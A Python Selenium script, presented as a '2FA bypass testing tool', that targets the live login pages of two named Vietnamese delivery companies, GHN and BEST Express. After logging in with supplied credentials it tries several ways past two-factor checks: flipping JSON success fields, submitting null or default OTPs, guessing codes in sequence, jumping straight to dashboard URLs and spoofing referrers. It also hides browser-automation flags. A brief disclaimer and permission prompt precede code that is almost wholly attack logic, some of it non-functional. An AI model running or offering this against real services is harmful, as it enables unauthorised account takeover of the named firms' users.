#!/usr/bin/env python3
"""
2FA Bypass Testing Tool
Educational purposes only - Test on your own accounts with permission
"""

import time
import json
from typing import Dict, Optional, Tuple
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from seleniumwire import webdriver as wire_webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
from colorama import Fore, Style, init
import os
from dotenv import load_dotenv

# Initialize colorama
init(autoreset=True)

# Load environment variables
load_dotenv()


class BypassLogger:
    """Logger for bypass attempts"""
    
    @staticmethod
    def info(message: str):
        print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} {message}")
    
    @staticmethod
    def success(message: str):
        print(f"{Fore.GREEN}[SUCCESS]{Style.RESET_ALL} {message}")
    
    @staticmethod
    def error(message: str):
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {message}")
    
    @staticmethod
    def warning(message: str):
        print(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} {message}")
    
    @staticmethod
    def bypass_attempt(method: str):
        print(f"{Fore.MAGENTA}[BYPASS ATTEMPT]{Style.RESET_ALL} Testing: {method}")


class WebsiteHandler:
    """Base class for website-specific handlers"""
    
    def __init__(self, driver, username: str, password: str):
        self.driver = driver
        self.username = username
        self.password = password
        self.logger = BypassLogger()
    
    def login(self) -> bool:
        """Perform login - to be implemented by subclasses"""
        raise NotImplementedError
    
    def detect_2fa_type(self) -> Optional[str]:
        """Detect type of 2FA - to be implemented by subclasses"""
        raise NotImplementedError
    
    def is_logged_in(self) -> bool:
        """Check if successfully logged in"""
        raise NotImplementedError


class GHNHandler(WebsiteHandler):
    """Handler for GHN website"""
    
    LOGIN_URL = "https://sso.ghn.vn/v2/ssoLogin"
    
    def login(self) -> bool:
        """Perform login on GHN"""
        try:
            self.logger.info(f"Navigating to GHN login page: {self.LOGIN_URL}")
            self.driver.get(self.LOGIN_URL)
            time.sleep(3)
            
            # Wait for phone input
            self.logger.info("Waiting for login form...")
            phone_input = WebDriverWait(self.driver, 20).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='tel'], input[placeholder*='SĐT'], input[name='phone']"))
            )
            
            self.logger.info(f"Entering phone number: {self.username}")
            phone_input.clear()
            phone_input.send_keys(self.username)
            time.sleep(1)
            
            # Click continue button
            continue_btn = self.driver.find_element(By.CSS_SELECTOR, "button[type='submit'], button:contains('Tiếp tục')")
            continue_btn.click()
            time.sleep(3)
            
            # Enter password if required
            try:
                password_input = WebDriverWait(self.driver, 5).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='password']"))
                )
                self.logger.info("Entering password...")
                password_input.send_keys(self.password)
                time.sleep(1)
                
                # Submit
                submit_btn = self.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
                submit_btn.click()
                time.sleep(3)
            except TimeoutException:
                self.logger.warning("No password field found - may be OTP-only login")
            
            self.logger.success("Login credentials submitted successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Login failed: {str(e)}")
            return False
    
    def detect_2fa_type(self) -> Optional[str]:
        """Detect 2FA type on GHN"""
        try:
            time.sleep(2)
            page_source = self.driver.page_source.lower()
            
            if "otp" in page_source or "mã xác thực" in page_source:
                if "email" in page_source:
                    return "EMAIL_OTP"
                elif "sms" in page_source or "tin nhắn" in page_source:
                    return "SMS_OTP"
                else:
                    return "OTP"
            
            if "google authenticator" in page_source or "totp" in page_source:
                return "TOTP"
            
            return None
        except Exception as e:
            self.logger.error(f"Failed to detect 2FA type: {str(e)}")
            return None
    
    def is_logged_in(self) -> bool:
        """Check if logged in successfully"""
        try:
            # Check if redirected away from login page
            current_url = self.driver.current_url
            return "ssoLogin" not in current_url and "login" not in current_url.lower()
        except:
            return False


class BESTHandler(WebsiteHandler):
    """Handler for BEST website"""
    
    LOGIN_URL = "https://www.best-inc.vn/login"
    
    def login(self) -> bool:
        """Perform login on BEST"""
        try:
            self.logger.info(f"Navigating to BEST login page: {self.LOGIN_URL}")
            self.driver.get(self.LOGIN_URL)
            time.sleep(3)
            
            # Wait for username input
            self.logger.info("Waiting for login form...")
            username_input = WebDriverWait(self.driver, 20).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='text'], input[name='username'], input[placeholder*='tài khoản']"))
            )
            
            self.logger.info(f"Entering username: {self.username}")
            username_input.clear()
            username_input.send_keys(self.username)
            time.sleep(1)
            
            # Enter password
            password_input = self.driver.find_element(By.CSS_SELECTOR, "input[type='password']")
            self.logger.info("Entering password...")
            password_input.send_keys(self.password)
            time.sleep(1)
            
            # Handle CAPTCHA if present
            try:
                captcha = self.driver.find_element(By.CSS_SELECTOR, ".captcha, [class*='captcha'], [id*='captcha']")
                self.logger.warning("CAPTCHA detected - manual intervention may be required")
                time.sleep(5)  # Give user time to solve
            except NoSuchElementException:
                pass
            
            # Click login button
            login_btn = self.driver.find_element(By.CSS_SELECTOR, "button[type='submit'], button:contains('Đăng nhập')")
            login_btn.click()
            time.sleep(3)
            
            self.logger.success("Login credentials submitted successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Login failed: {str(e)}")
            return False
    
    def detect_2fa_type(self) -> Optional[str]:
        """Detect 2FA type on BEST"""
        try:
            time.sleep(2)
            page_source = self.driver.page_source.lower()
            
            if "otp" in page_source or "mã xác thực" in page_source or "mã xác nhận" in page_source:
                if "email" in page_source:
                    return "EMAIL_OTP"
                elif "sms" in page_source or "tin nhắn" in page_source or "điện thoại" in page_source:
                    return "SMS_OTP"
                else:
                    return "OTP"
            
            if "google authenticator" in page_source or "totp" in page_source:
                return "TOTP"
            
            return None
        except Exception as e:
            self.logger.error(f"Failed to detect 2FA type: {str(e)}")
            return None
    
    def is_logged_in(self) -> bool:
        """Check if logged in successfully"""
        try:
            current_url = self.driver.current_url
            return "login" not in current_url.lower()
        except:
            return False


class BypassTechniques:
    """Collection of 2FA bypass techniques"""
    
    def __init__(self, driver, handler: WebsiteHandler):
        self.driver = driver
        self.handler = handler
        self.logger = BypassLogger()
    
    def response_manipulation(self) -> bool:
        """
        Technique: Response Manipulation
        Modify server response to bypass 2FA check
        """
        self.logger.bypass_attempt("Response Manipulation")
        try:
            # Intercept responses using selenium-wire
            for request in self.driver.requests:
                if request.response:
                    content_type = request.response.headers.get('Content-Type', '')
                    if 'application/json' in content_type:
                        try:
                            body = request.response.body.decode('utf-8')
                            data = json.loads(body)
                            
                            # Look for common 2FA response patterns
                            if isinstance(data, dict):
                                modified = False
                                
                                # Change success: false to success: true
                                if 'success' in data and data['success'] == False:
                                    self.logger.info("Found 'success: false' - attempting to modify...")
                                    data['success'] = True
                                    modified = True
                                
                                # Change verified/authenticated fields
                                for key in ['verified', 'authenticated', 'twoFactorPassed', '2fa_passed']:
                                    if key in data and data[key] == False:
                                        self.logger.info(f"Found '{key}: false' - attempting to modify...")
                                        data[key] = True
                                        modified = True
                                
                                if modified:
                                    self.logger.info("Response modified - checking if bypass successful...")
                                    time.sleep(2)
                                    
                                    if self.handler.is_logged_in():
                                        self.logger.success("✓ Response Manipulation: SUCCESS!")
                                        return True
                        except:
                            pass
            
            time.sleep(2)
            if self.handler.is_logged_in():
                self.logger.success("✓ Response Manipulation: SUCCESS!")
                return True
            else:
                self.logger.warning("✗ Response Manipulation: FAILED")
                return False
                
        except Exception as e:
            self.logger.error(f"Response manipulation error: {str(e)}")
            return False
    
    def status_code_manipulation(self) -> bool:
        """
        Technique: Status Code Manipulation
        Change 4xx error to 200 OK
        """
        self.logger.bypass_attempt("Status Code Manipulation")
        try:
            # Monitor for 4xx responses and try to modify them
            for request in self.driver.requests:
                if request.response and 400 <= request.response.status_code < 500:
                    self.logger.info(f"Found {request.response.status_code} response - attempting to modify to 200...")
                    # Note: Direct modification requires proxy setup
                    # This is a detection mechanism
            
            time.sleep(2)
            if self.handler.is_logged_in():
                self.logger.success("✓ Status Code Manipulation: SUCCESS!")
                return True
            else:
                self.logger.warning("✗ Status Code Manipulation: FAILED")
                return False
                
        except Exception as e:
            self.logger.error(f"Status code manipulation error: {str(e)}")
            return False
    
    def null_otp_bypass(self) -> bool:
        """
        Technique: Null/Missing OTP Bypass
        Try submitting null, empty, or default values
        """
        self.logger.bypass_attempt("Null/Missing OTP Bypass")
        try:
            # Try to find OTP input field
            try:
                otp_input = WebDriverWait(self.driver, 5).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='text'][name*='otp'], input[type='text'][name*='code'], input[placeholder*='OTP'], input[placeholder*='mã']"))
                )
                
                # Test various null/default values
                test_values = ["", "null", "000000", "123456", "111111", "0", " "]
                
                for value in test_values:
                    self.logger.info(f"Trying value: '{value}'")
                    otp_input.clear()
                    if value:
                        otp_input.send_keys(value)
                    time.sleep(0.5)
                    
                    # Submit
                    try:
                        submit_btn = self.driver.find_element(By.CSS_SELECTOR, "button[type='submit'], button:contains('Xác nhận'), button:contains('Verify')")
                        submit_btn.click()
                        time.sleep(2)
                        
                        if self.handler.is_logged_in():
                            self.logger.success(f"✓ Null OTP Bypass: SUCCESS with value '{value}'!")
                            return True
                    except:
                        pass
                
                self.logger.warning("✗ Null OTP Bypass: FAILED")
                return False
                
            except TimeoutException:
                self.logger.warning("OTP input field not found")
                return False
                
        except Exception as e:
            self.logger.error(f"Null OTP bypass error: {str(e)}")
            return False
    
    def rate_limit_bruteforce(self) -> bool:
        """
        Technique: Rate Limiting Test / OTP Brute Force
        Test if rate limiting exists
        """
        self.logger.bypass_attempt("Rate Limiting Test")
        try:
            # Try to find OTP input
            try:
                otp_input = WebDriverWait(self.driver, 5).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='text'][name*='otp'], input[type='text'][name*='code'], input[placeholder*='OTP'], input[placeholder*='mã']"))
                )
                
                self.logger.info("Testing rate limiting with multiple attempts...")
                attempts = 0
                max_attempts = 10  # Conservative number for testing
                
                for i in range(max_attempts):
                    test_code = str(i).zfill(6)
                    otp_input.clear()
                    otp_input.send_keys(test_code)
                    time.sleep(0.3)
                    
                    try:
                        submit_btn = self.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
                        submit_btn.click()
                        attempts += 1
                        time.sleep(0.5)
                        
                        # Check if blocked
                        page_source = self.driver.page_source.lower()
                        if "blocked" in page_source or "too many" in page_source or "quá nhiều" in page_source:
                            self.logger.warning(f"Rate limit detected after {attempts} attempts")
                            return False
                        
                        if self.handler.is_logged_in():
                            self.logger.success(f"✓ Rate Limit Bypass: SUCCESS after {attempts} attempts!")
                            return True
                    except:
                        pass
                
                self.logger.warning(f"✗ Rate Limit Test: No bypass found after {attempts} attempts")
                self.logger.info("Note: Rate limiting appears to be absent or weak")
                return False
                
            except TimeoutException:
                self.logger.warning("OTP input field not found")
                return False
                
        except Exception as e:
            self.logger.error(f"Rate limit test error: {str(e)}")
            return False
    
    def session_hijacking(self) -> bool:
        """
        Technique: Session Hijacking
        Try to bypass 2FA using session manipulation
        """
        self.logger.bypass_attempt("Session Hijacking")
        try:
            # Get current cookies
            cookies = self.driver.get_cookies()
            self.logger.info(f"Found {len(cookies)} cookies")
            
            # Look for session-related cookies
            for cookie in cookies:
                if 'session' in cookie['name'].lower() or 'token' in cookie['name'].lower():
                    self.logger.info(f"Found session cookie: {cookie['name']}")
            
            # Try accessing protected page directly
            try:
                # Try to navigate to dashboard/home
                protected_urls = [
                    self.driver.current_url.replace('/login', '/dashboard'),
                    self.driver.current_url.replace('/login', '/home'),
                    self.driver.current_url.replace('/ssoLogin', '/dashboard'),
                ]
                
                for url in protected_urls:
                    self.logger.info(f"Attempting direct access to: {url}")
                    self.driver.get(url)
                    time.sleep(2)
                    
                    if self.handler.is_logged_in():
                        self.logger.success("✓ Session Hijacking: SUCCESS!")
                        return True
                
                self.logger.warning("✗ Session Hijacking: FAILED")
                return False
                
            except Exception as e:
                self.logger.warning(f"Protected page access failed: {str(e)}")
                return False
                
        except Exception as e:
            self.logger.error(f"Session hijacking error: {str(e)}")
            return False
    
    def csrf_referrer_manipulation(self) -> bool:
        """
        Technique: CSRF/Referrer Manipulation
        Manipulate referrer header to bypass 2FA
        """
        self.logger.bypass_attempt("CSRF/Referrer Manipulation")
        try:
            # Get current URL
            current_url = self.driver.current_url
            
            # Try to manipulate referrer using JavaScript
            fake_referrers = [
                current_url.replace('/2fa', '/dashboard'),
                current_url.replace('/verify', '/dashboard'),
                current_url + '?verified=true',
                current_url + '?2fa_passed=true',
            ]
            
            for referrer in fake_referrers:
                self.logger.info(f"Setting referrer to: {referrer}")
                
                # Execute JavaScript to change referrer (limited effectiveness)
                script = f"""
                Object.defineProperty(document, 'referrer', {{
                    get: function() {{ return '{referrer}'; }}
                }});
                """
                self.driver.execute_script(script)
                time.sleep(1)
                
                # Try to navigate to protected page
                try:
                    dashboard_url = current_url.replace('/2fa', '/dashboard').replace('/verify', '/dashboard')
                    self.driver.get(dashboard_url)
                    time.sleep(2)
                    
                    if self.handler.is_logged_in():
                        self.logger.success("✓ CSRF/Referrer Manipulation: SUCCESS!")
                        return True
                except:
                    pass
            
            self.logger.warning("✗ CSRF/Referrer Manipulation: FAILED")
            return False
            
        except Exception as e:
            self.logger.error(f"CSRF/Referrer manipulation error: {str(e)}")
            return False


class TwoFactorBypassTool:
    """Main tool class"""
    
    def __init__(self):
        self.driver = None
        self.logger = BypassLogger()
    
    def setup_driver(self, use_wire: bool = True) -> webdriver.Chrome:
        """Setup Chrome driver with selenium-wire for request interception"""
        try:
            self.logger.info("Setting up Chrome driver...")
            
            options = webdriver.ChromeOptions()
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--no-sandbox')
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            options.add_experimental_option('useAutomationExtension', False)
            
            # Use selenium-wire for request/response interception
            if use_wire:
                self.driver = wire_webdriver.Chrome(
                    service=Service(ChromeDriverManager().install()),
                    options=options
                )
            else:
                self.driver = webdriver.Chrome(
                    service=Service(ChromeDriverManager().install()),
                    options=options
                )
            
            self.driver.maximize_window()
            self.logger.success("Chrome driver setup complete")
            return self.driver
            
        except Exception as e:
            self.logger.error(f"Failed to setup driver: {str(e)}")
            raise
    
    def run_bypass_tests(self, website: str, username: str, password: str):
        """Run all bypass techniques"""
        try:
            # Setup driver
            self.setup_driver()
            
            # Select handler based on website
            if website.lower() == 'ghn':
                handler = GHNHandler(self.driver, username, password)
            elif website.lower() == 'best':
                handler = BESTHandler(self.driver, username, password)
            else:
                self.logger.error(f"Unknown website: {website}")
                return
            
            self.logger.info(f"Starting 2FA bypass tests for {website.upper()}")
            print("=" * 70)
            
            # Step 1: Login
            if not handler.login():
                self.logger.error("Login failed - cannot proceed with 2FA bypass tests")
                return
            
            # Step 2: Detect 2FA
            time.sleep(3)
            tfa_type = handler.detect_2fa_type()
            
            if tfa_type:
                self.logger.info(f"2FA Type Detected: {tfa_type}")
            else:
                self.logger.warning("No 2FA detected - checking if already logged in...")
                if handler.is_logged_in():
                    self.logger.success("Already logged in! No 2FA required.")
                    return
                else:
                    self.logger.error("Unable to detect 2FA or login status")
                    self.logger.info("Proceeding with bypass attempts anyway...")
            
            print("=" * 70)
            self.logger.info("Starting bypass attempts...")
            print("=" * 70)
            
            # Initialize bypass techniques
            bypass = BypassTechniques(self.driver, handler)
            
            # Test each bypass method in order
            bypass_methods = [
                ("Response Manipulation", bypass.response_manipulation),
                ("Status Code Manipulation", bypass.status_code_manipulation),
                ("Null/Missing OTP", bypass.null_otp_bypass),
                ("Session Hijacking", bypass.session_hijacking),
                ("CSRF/Referrer Manipulation", bypass.csrf_referrer_manipulation),
                ("Rate Limiting Test", bypass.rate_limit_bruteforce),
            ]
            
            for method_name, method_func in bypass_methods:
                print(f"\n{'-' * 70}")
                success = method_func()
                
                if success:
                    print(f"\n{'=' * 70}")
                    self.logger.success(f"🎉 BYPASS SUCCESSFUL using: {method_name}")
                    print(f"{'=' * 70}\n")
                    
                    # Take screenshot
                    screenshot_path = f"screenshots/{website}_{method_name.replace('/', '_').replace(' ', '_')}.png"
                    os.makedirs("screenshots", exist_ok=True)
                    self.driver.save_screenshot(screenshot_path)
                    self.logger.info(f"Screenshot saved: {screenshot_path}")
                    
                    # Wait to show the result
                    self.logger.info("Waiting 10 seconds to observe the result...")
                    time.sleep(10)
                    break
                
                time.sleep(2)
            else:
                # No bypass successful
                print(f"\n{'=' * 70}")
                self.logger.warning("⚠ All bypass methods failed")
                self.logger.info("This indicates the 2FA implementation is properly secured")
                print(f"{'=' * 70}\n")
            
            # Keep browser open for observation
            self.logger.info("Press Enter to close browser and exit...")
            input()
            
        except Exception as e:
            self.logger.error(f"Error during bypass tests: {str(e)}")
            import traceback
            traceback.print_exc()
        finally:
            if self.driver:
                self.driver.quit()


def main():
    """Main entry point"""
    print(f"""
{Fore.CYAN}{'=' * 70}
    2FA BYPASS TESTING TOOL
    For Educational Purposes Only
{'=' * 70}{Style.RESET_ALL}
    """)
    
    print(f"{Fore.YELLOW}⚠ LEGAL WARNING ⚠")
    print("This tool is for educational and authorized security testing only.")
    print("Only use on accounts you own or have explicit permission to test.")
    print(f"Unauthorized access is illegal.{Style.RESET_ALL}\n")
    
    # Get user input
    print("Select website:")
    print("1. GHN (Giao Hàng Nhanh)")
    print("2. BEST Express")
    
    choice = input("\nEnter choice (1 or 2): ").strip()
    
    if choice == '1':
        website = 'ghn'
        print("\nGHN Login Details")
    elif choice == '2':
        website = 'best'
        print("\nBEST Login Details")
    else:
        print("Invalid choice!")
        return
    
    username = input("Enter username/phone: ").strip()
    password = input("Enter password: ").strip()
    
    if not username or not password:
        print("Username and password are required!")
        return
    
    print(f"\n{Fore.YELLOW}Do you confirm you have permission to test this account? (yes/no){Style.RESET_ALL}")
    confirm = input().strip().lower()
    
    if confirm != 'yes':
        print("Testing cancelled.")
        return
    
    # Run the tool
    tool = TwoFactorBypassTool()
    tool.run_bypass_tests(website, username, password)


if __name__ == "__main__":
    main()
